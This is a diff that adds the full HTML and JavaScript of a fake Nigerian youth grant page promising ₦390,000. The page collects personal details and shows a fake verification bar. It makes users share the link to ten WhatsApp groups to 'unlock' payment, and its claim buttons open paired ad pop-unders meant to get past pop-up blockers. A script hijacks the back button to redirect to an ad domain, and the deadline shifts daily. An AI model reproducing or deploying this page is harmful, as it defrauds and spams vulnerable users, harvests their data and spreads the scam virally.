@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Solar Power Nigeria Youth Grant 2026</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+    <style>
+        :root {
+            /* Soft Green Energy Theme */
+            --primary-green: #10B981;
+            --primary-dark: #047857;
+            --primary-light: #D1FAE5;
+            --accent-yellow: #FBBF24;
+            --accent-yellow-light: #FEF3C7;
+            --bg-color: #F8FAFC;
+            --text-main: #1E293B;
+            --text-muted: #64748B;
+            --white: #FFFFFF;
+            --danger: #EF4444;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ═══════════════════════════════════════════ 
+           GLOBAL UI ELEMENTS
+        ═══════════════════════════════════════════ */
+        .app-container {
+            max-width: 500px;
+            margin: 0 auto;
+            width: 100%;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            background: var(--bg-color);
+        }
+
+        .header {
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--white);
+            border-bottom: 1px solid #E2E8F0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.02);
+        }
+        
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 800;
+            color: var(--primary-dark);
+            font-size: 16px;
+        }
+        
+        .logo-area i {
+            font-size: 24px;
+            color: var(--primary-green);
+        }
+
+        .secure-badge {
+            font-size: 11px;
+            background: var(--primary-light);
+            color: var(--primary-dark);
+            padding: 4px 8px;
+            border-radius: 20px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            width: 100%;
+            height: 4px;
+            background: #E2E8F0;
+            position: sticky;
+            top: 68px; /* Below header */
+            z-index: 99;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--primary-green);
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+
+        /* Page Transitions */
+        .page {
+            display: none;
+            padding: 25px 20px 40px;
+            animation: fadeIn 0.4s ease forwards;
+            flex: 1;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background: var(--primary-green);
+            color: var(--white);
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.98);
+            box-shadow: 0 2px 5px rgba(16, 185, 129, 0.3);
+        }
+
+        .btn-whatsapp {
+            background: #25D366;
+            color: white;
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
+        }
+
+        .btn-yellow {
+            background: var(--accent-yellow);
+            color: var(--text-main);
+            box-shadow: 0 4px 15px rgba(251, 191, 36, 0.3);
+            font-weight: 800;
+        }
+
+        /* ═══════════════════════════════════════════ 
+           SPECIFIC PAGE STYLES
+        ═══════════════════════════════════════════ */
+        
+        /* Intro Page */
+        .hero-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--primary-light);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            color: var(--primary-green);
+            margin: 10px auto 20px;
+        }
+
+        .grant-title {
+            font-size: 28px;
+            font-weight: 800;
+            text-align: center;
+            line-height: 1.2;
+            color: var(--text-main);
+            margin-bottom: 10px;
+        }
+
+        .grant-title span {
+            color: var(--primary-dark);
+        }
+
+        .grant-amount {
+            text-align: center;
+            font-size: 48px;
+            font-weight: 800;
+            color: var(--primary-green);
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }
+
+        .info-card {
+            background: var(--white);
+            border-radius: 16px;
+            padding: 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.04);
+            margin-bottom: 20px;
+        }
+
+        .info-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .info-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-row i {
+            color: var(--primary-green);
+            font-size: 18px;
+            margin-top: 2px;
+            width: 20px;
+            text-align: center;
+        }
+
+        .info-row strong {
+            color: var(--text-main);
+        }
+
+        .urgency-badge {
+            background: var(--accent-yellow-light);
+            color: #B45309;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        /* Form Page */
+        .form-header {
+            margin-bottom: 25px;
+        }
+        
+        .form-header h2 {
+            font-size: 22px;
+            color: var(--text-main);
+            margin-bottom: 5px;
+        }
+        
+        .form-header p {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text-main);
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #E2E8F0;
+            border-radius: 10px;
+            font-size: 15px;
+            background: var(--white);
+            transition: border-color 0.3s;
+            outline: none;
+            font-family: inherit;
+            color: var(--text-main);
+        }
+
+        .form-control:focus {
+            border-color: var(--primary-green);
+        }
+
+        textarea.form-control {
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .radio-card {
+            display: flex;
+            align-items: center;
+            padding: 14px;
+            border: 2px solid #E2E8F0;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: var(--white);
+        }
+
+        .radio-card input {
+            margin-right: 12px;
+            accent-color: var(--primary-green);
+            width: 18px;
+            height: 18px;
+        }
+
+        .radio-card.selected {
+            border-color: var(--primary-green);
+            background: #F0FDF4;
+        }
+
+        .radio-card span {
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        /* Loader Page */
+        .loader-box {
+            text-align: center;
+            padding-top: 50px;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid var(--primary-light);
+            border-top-color: var(--primary-green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .loader-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--text-main);
+            margin-bottom: 10px;
+        }
+
+        .loader-subtext {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin-bottom: 30px;
+        }
+
+        .progress-box {
+            background: var(--white);
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+
+        .progress-bar-bg {
+            width: 100%;
+            height: 12px;
+            background: #E2E8F0;
+            border-radius: 6px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: var(--primary-green);
+            width: 0%;
+            border-radius: 6px;
+            transition: width 0.1s linear;
+        }
+
+        .progress-text {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--primary-green);
+            text-align: right;
+        }
+
+        /* Pre-approved / Share Page */
+        .receipt-card {
+            background: var(--white);
+            border-radius: 16px;
+            padding: 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            margin-bottom: 20px;
+            border-left: 4px solid var(--primary-green);
+        }
+
+        .receipt-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+            align-items: center;
+        }
+
+        .receipt-row:last-child {
+            margin-bottom: 0;
+            padding-top: 10px;
+            border-top: 1px dashed #E2E8F0;
+        }
+
+        .receipt-label { color: var(--text-muted); }
+        .receipt-val { font-weight: 600; color: var(--text-main); text-align: right; max-width: 60%; }
+
+        .status-pill {
+            background: var(--accent-yellow-light);
+            color: #B45309;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .status-pill::before {
+            content: '';
+            width: 6px;
+            height: 6px;
+            background: #B45309;
+            border-radius: 50%;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink { 50% { opacity: 0.3; } }
+
+        .success-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .success-icon {
+            font-size: 40px;
+            color: var(--primary-green);
+            margin-bottom: 10px;
+        }
+
+        .success-header h2 {
+            font-size: 22px;
+            color: var(--primary-dark);
+            margin-bottom: 5px;
+        }
+
+        .success-header p {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .share-instructions {
+            background: #F0FDF4;
+            border: 1px solid #BBF7D0;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: var(--primary-dark);
+            line-height: 1.5;
+        }
+
+        /* Final Claim Page */
+        .claim-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .claim-header h2 {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--text-main);
+            margin-bottom: 10px;
+        }
+
+        .claim-header p {
+            font-size: 14px;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+
+        .claim-btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .claim-btn {
+            background: var(--white);
+            border: 2px solid var(--primary-green);
+            color: var(--primary-dark);
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            text-decoration: none;
+            transition: background 0.2s;
+            cursor: pointer;
+        }
+        
+        .claim-btn:active {
+            background: var(--primary-light);
+        }
+
+        .claim-btn i {
+            color: var(--primary-green);
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--white);
+            padding: 30px 20px 20px;
+            text-align: center;
+            border-top: 1px solid #E2E8F0;
+            margin-top: 40px;
+        }
+
+        .footer p {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-bottom: 10px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .footer-links a {
+            color: var(--text-main);
+            font-size: 12px;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .supercounter-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 30px;
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <!-- Header -->
+    <header class="header">
+        <div class="logo-area">
+            <i class="fa-solid fa-solar-panel"></i> Solar Grant 2026
+        </div>
+        <div class="secure-badge">
+            <i class="fa-solid fa-lock"></i> Secure
+        </div>
+    </header>
+
+    <!-- Progress Bar -->
+    <div class="progress-container">
+        <div class="progress-bar" id="topProgress"></div>
+    </div>
+
+    <!-- PAGE 1: INTRO -->
+    <div class="page active" id="page-intro">
+        <div class="hero-icon">
+            <i class="fa-solid fa-sun"></i>
+        </div>
+        
+        <h1 class="grant-title">Solar Power Nigeria <br><span>Youth Grant 2026</span></h1>
+        <div class="grant-amount">₦390,000</div>
+        
+        <div class="info-card">
+            <div class="info-row">
+                <i class="fa-solid fa-bullseye"></i>
+                <div><strong>Purpose:</strong> Funding for solar/clean energy project ideas to power homes.</div>
+            </div>
+            <div class="info-row">
+                <i class="fa-solid fa-users"></i>
+                <div><strong>Eligibility:</strong> Young Nigerians aged 18 and above.</div>
+            </div>
+        </div>
+
+        <div class="urgency-badge">
+            <i class="fa-solid fa-fire"></i> Applications close <span id="offer-date" style="margin: 0 3px;"></span>
+        </div>
+
+        <button class="btn btn-primary" onclick="nextPage('page-form', 25)">
+            Apply Now <i class="fa-solid fa-arrow-right"></i>
+        </button>
+    </div>
+
+    <!-- PAGE 2: MULTI-STEP FORM -->
+    <div class="page" id="page-form">
+        <div class="form-header">
+            <h2>Application Form</h2>
+            <p>Please provide accurate details for verification.</p>
+        </div>
+
+        <form id="grantForm" onsubmit="submitForm(event)">
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" id="fullName" class="form-control" placeholder="e.g. John Doe" required>
+            </div>
+
+            <div class="form-group">
+                <label>Phone Number</label>
+                <input type="tel" id="phoneNumber" class="form-control" placeholder="e.g. 08012345678" required>
+            </div>
+
+            <div class="form-group">
+                <label>State of Residence</label>
+                <select id="state" class="form-control" required>
+                    <option value="" disabled selected>Select your state</option>
+                    <option value="Abia">Abia</option>
+                    <option value="Adamawa">Adamawa</option>
+                    <option value="Akwa Ibom">Akwa Ibom</option>
+                    <option value="Anambra">Anambra</option>
+                    <option value="Bauchi">Bauchi</option>
+                    <option value="Bayelsa">Bayelsa</option>
+                    <option value="Benue">Benue</option>
+                    <option value="Borno">Borno</option>
+                    <option value="Cross River">Cross River</option>
+                    <option value="Delta">Delta</option>
+                    <option value="Ebonyi">Ebonyi</option>
+                    <option value="Edo">Edo</option>
+                    <option value="Ekiti">Ekiti</option>
+                    <option value="Enugu">Enugu</option>
+                    <option value="FCT">FCT - Abuja</option>
+                    <option value="Gombe">Gombe</option>
+                    <option value="Imo">Imo</option>
+                    <option value="Jigawa">Jigawa</option>
+                    <option value="Kaduna">Kaduna</option>
+                    <option value="Kano">Kano</option>
+                    <option value="Katsina">Katsina</option>
+                    <option value="Kebbi">Kebbi</option>
+                    <option value="Kogi">Kogi</option>
+                    <option value="Kwara">Kwara</option>
+                    <option value="Lagos">Lagos</option>
+                    <option value="Nasarawa">Nasarawa</option>
+                    <option value="Niger">Niger</option>
+                    <option value="Ogun">Ogun</option>
+                    <option value="Ondo">Ondo</option>
+                    <option value="Osun">Osun</option>
+                    <option value="Oyo">Oyo</option>
+                    <option value="Plateau">Plateau</option>
+                    <option value="Rivers">Rivers</option>
+                    <option value="Sokoto">Sokoto</option>
+                    <option value="Taraba">Taraba</option>
+                    <option value="Yobe">Yobe</option>
+                    <option value="Zamfara">Zamfara</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Age</label>
+                <input type="number" id="age" class="form-control" placeholder="Must be 18 and above" min="18" required>
+            </div>
+
+            <div class="form-group">
+                <label>Do you currently own a home or are you renting an apartment?</label>
+                <div class="radio-group">
+                    <label class="radio-card">
+                        <input type="radio" name="housing" value="Own Home" required onchange="selectRadio(this)"> <span>Own Home</span>
+                    </label>
+                    <label class="radio-card">
+                        <input type="radio" name="housing" value="Renting" required onchange="selectRadio(this)"> <span>Renting an apartment</span>
+                    </label>
+                    <label class="radio-card">
+                        <input type="radio" name="housing" value="Living with family" required onchange="selectRadio(this)"> <span>Living with family</span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Briefly describe your idea</label>
+                <textarea id="ideaDesc" class="form-control" placeholder="Tell us about your solar/clean energy project..." required></textarea>
+            </div>
+
+            <button type="submit" class="btn btn-primary" style="margin-top: 10px;">
+                Submit Application <i class="fa-solid fa-paper-plane"></i>
+            </button>
+        </form>
+    </div>
+
+    <!-- PAGE 3: LOADING/CHECKING -->
+    <div class="page" id="page-loading">
+        <div class="loader-box">
+            <div class="spinner"></div>
+            <h2 class="loader-text">Verifying Application...</h2>
+            <p class="loader-subtext">Please wait while we check your details against our database.</p>
+            
+            <div class="progress-box">
+                <div class="progress-bar-bg">
+                    <div class="progress-bar-fill" id="checkProgress"></div>
+                </div>
+                <div class="progress-text" id="checkPercent">0%</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 4: PRE-APPROVED / SHARE GATE -->
+    <div class="page" id="page-share">
+        <div class="success-header">
+            <i class="fa-solid fa-circle-check success-icon"></i>
+            <h2>Pre-Qualified!</h2>
+            <p>Your details have been reviewed.</p>
+        </div>
+
+        <div class="receipt-card">
+            <div class="receipt-row">
+                <span class="receipt-label">Applicant Name</span>
+                <span class="receipt-val" id="res-name">-</span>
+            </div>
+            <div class="receipt-row">
+                <span class="receipt-label">State</span>
+                <span class="receipt-val" id="res-state">-</span>
+            </div>
+            <div class="receipt-row">
+                <span class="receipt-label">Grant Amount</span>
+                <span class="receipt-val" style="color: var(--primary-green); font-weight: 800; font-size: 16px;">₦390,000</span>
+            </div>
+            <div class="receipt-row">
+                <span class="receipt-label">Status</span>
+                <span class="receipt-val"><span class="status-pill">PENDING VERIFICATION</span></span>
+            </div>
+        </div>
+
+        <div class="share-instructions">
+            <strong>Action Required:</strong> To unlock your grant funding and finalize your application, you must share this opportunity with other young Nigerians. 
+            <br><br>
+            <strong>Step 1:</strong> Click the button below to share on WhatsApp.
+            <br>
+            <strong>Step 2:</strong> Share to <strong>10 groups or 20 friends</strong> to complete the verification bar.
+        </div>
+
+        <button class="btn btn-whatsapp" onclick="handleShare()">
+            <i class="fa-brands fa-whatsapp" style="font-size: 20px;"></i> Share on WhatsApp
+        </button>
+        
+        <div style="margin-top: 15px;">
+            <div class="progress-bar-bg" style="height: 8px;">
+                <div class="progress-bar-fill" id="shareProgress" style="width: 0%;"></div>
+            </div>
+            <div style="text-align: right; font-size: 12px; font-weight: 700; color: var(--primary-green); margin-top: 5px;" id="sharePercent">0%</div>
+        </div>
+    </div>
+
+    <!-- PAGE 5: FINAL CLAIM -->
+    <div class="page" id="page-claim">
+        <div class="claim-header">
+            <h2>Payment Approved</h2>
+            <p>Your application is fully verified. Click the buttons below to claim your ₦390,000 grant funding or check your status.</p>
+        </div>
+
+        <div class="claim-btn-group">
+            <!-- 
+                The openAds() function is used here. 
+                When clicked, it opens two links simultaneously in new tabs. 
+            -->
+            <div class="claim-btn" onclick="openAds('https://uplcm.com/4/10077877', 'https://uplcm.com/4/9742092')">
+                <span>Claim ₦390,000 Funding</span>
+                <i class="fa-solid fa-arrow-right"></i>
+            </div>
+            <div class="claim-btn" onclick="openAds('https://uplcm.com/4/9742092', 'https://uplcm.com/4/9742301')">
+                <span>Verify Account Details</span>
+                <i class="fa-solid fa-user-check"></i>
+            </div>
+            <div class="claim-btn" onclick="openAds('https://uplcm.com/4/10077877', 'https://uplcm.com/4/9742301')">
+                <span>Download Grant Receipt</span>
+                <i class="fa-solid fa-download"></i>
+            </div>
+            <div class="claim-btn" onclick="openAds('https://uplcm.com/4/9742301', 'https://uplcm.com/4/10077877')">
+                <span>Check Payment Status</span>
+                <i class="fa-solid fa-clock-rotate-left"></i>
+            </div>
+        </div>
+
+        <button class="btn btn-yellow" onclick="openAds('https://uplcm.com/4/10077877', 'https://uplcm.com/4/9742092')">
+            Approve Final Payment <i class="fa-solid fa-check-double"></i>
+        </button>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Contact Support</a>
+        </div>
+        <p>&copy; 2026 Solar Power Nigeria Youth Grant. All Rights Reserved.</p>
+        
+        <!-- Supercounter -->
+        <div class="supercounter-wrapper">
+            <script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+            <script type="text/javascript">sc_online_i(1741437,"047857","FFFFFF");</script>
+        </div>
+    </footer>
+</div>
+
+<script>
+    // ═══════════════════════════════════════════ 
+    // AD LINK / POP-UNDER LOGIC
+    // ═══════════════════════════════════════════
+    function openAds(url1, url2) {
+        // Open first link
+        window.open(url1, '_blank');
+        
+        // Open second link with a tiny delay to bypass pop-up blockers
+        setTimeout(function() {
+            window.open(url2, '_blank');
+        }, 250);
+    }
+
+    // ═══════════════════════════════════════════ 
+    // AGGRESSIVE BACK BUTTON REDIRECT
+    // ═══════════════════════════════════════════
+    window.addEventListener('popstate', function() {
+        history.pushState(null, null, document.URL);
+        window.location.href = "https://uplcm.com/4/10077877"; 
+    });
+    history.pushState(null, null, document.URL);
+
+    // ═══════════════════════════════════════════ 
+    // DYNAMIC OFFER DATE SCRIPT
+    // ═══════════════════════════════════════════
+    function updateOfferDate() {
+        const tomorrow = new Date();
+        tomorrow.setDate(tomorrow.getDate() + 2);
+
+        const day = tomorrow.getDate();
+        const month = tomorrow.toLocaleString('en-GB', {
+            month: 'long'
+        });
+
+        let suffix = 'th';
+
+        if (day % 100 < 11 || day % 100 > 13) {
+            if (day % 10 === 1) suffix = 'st';
+            else if (day % 10 === 2) suffix = 'nd';
+            else if (day % 10 === 3) suffix = 'rd';
+        }
+
+        document.getElementById('offer-date').textContent = `Ending ${day}${suffix} ${month}`;
+    }
+
+    // Run the date updater
+    updateOfferDate();
+
+    // ═══════════════════════════════════════════ 
+    // APP LOGIC
+    // ═══════════════════════════════════════════
+
+    // Progress bar controller
+    function updateTopProgress(percent) {
+        document.getElementById('topProgress').style.width = percent + '%';
+    }
+
+    // Page navigation
+    function nextPage(pageId, progressPercent) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(pageId).classList.add('active');
+        updateTopProgress(progressPercent);
+        window.scrollTo(0, 0);
+    }
+
+    // Radio card visual selection
+    function selectRadio(radioElement) {
+        const group = radioElement.closest('.radio-group');
+        group.querySelectorAll('.radio-card').forEach(card => card.classList.remove('selected'));
+        if (radioElement.checked) {
+            radioElement.closest('.radio-card').classList.add('selected');
+        }
+    }
+
+    // Form Submission
+    function submitForm(e) {
+        e.preventDefault();
+        
+        // Capture Data
+        const name = document.getElementById('fullName').value;
+        const state = document.getElementById('state').value;
+        
+        // Set Receipt Data
+        document.getElementById('res-name').textContent = name;
+        document.getElementById('res-state').textContent = state;
+
+        // Go to loading page
+        nextPage('page-loading', 50);
+        
+        // Simulate checking process
+        let progress = 0;
+        const checkBar = document.getElementById('checkProgress');
+        const checkText = document.getElementById('checkPercent');
+        
+        const interval = setInterval(() => {
+            // Progress logic to make it look realistic
+            if (progress < 60) {
+                progress += 2;
+            } else if (progress < 85) {
+                progress += 1;
+            } else {
+                progress += 3;
+            }
+
+            if (progress > 100) progress = 100;
+            
+            checkBar.style.width = progress + '%';
+            checkText.textContent = progress + '%';
+            
+            if (progress === 100) {
+                clearInterval(interval);
+                setTimeout(() => {
+                    nextPage('page-share', 75);
+                }, 500);
+            }
+        }, 50);
+    }
+
+    // Share Gate Logic (10 Shares required)
+    let shareClicks = 0;
+    const shareText = "*SOLAR POWER NIGERIA YOUTH GRANT 2026*%0A%0AYoung Nigerians can now apply for a *₦390,000 grant* to implement solar/clean energy ideas in their homes.%0A%0A✅ ₦390,000 project funding%0A✅ Mentorship included%0A✅ Deadline: 24 November 2026%0A%0ACheck if you qualify here 👇%0Ahttps://metaink.xyz/Solar-Power-Nigeria-Youth-Grant%0A%0A_Share with other young people so they don’t miss this._";
+    const shareUrl = "whatsapp://send?text=" + shareText;
+
+    function handleShare() {
+        // Open WhatsApp
+        window.location.href = shareUrl;
+        
+        // Progressive logic
+        shareClicks++;
+        
+        const shareBar = document.getElementById('shareProgress');
+        const shareTextEl = document.getElementById('sharePercent');
+        
+        // Calculate percentage: 10 clicks = 100%
+        let targetPercent = Math.min(Math.round((shareClicks / 10) * 100), 100);
+
+        // Milestone alerts to keep them engaged
+        if (shareClicks === 3) {
+            alert("Good start! Share with more groups to continue verification.");
+        } else if (shareClicks === 6) {
+            alert("Halfway there! Keep sharing to unlock payment.");
+        } else if (shareClicks === 9) {
+            alert("Almost there! Just 1 more share to verify and unlock payment.");
+        }
+
+        shareBar.style.width = targetPercent + '%';
+        shareTextEl.textContent = targetPercent + '%';
+
+        if (shareClicks >= 10) {
+            shareTextEl.textContent = "100%";
+            setTimeout(() => {
+                nextPage('page-claim', 100);
+            }, 800);
+        }
+    }
+</script>
+
+</body>
+</html>
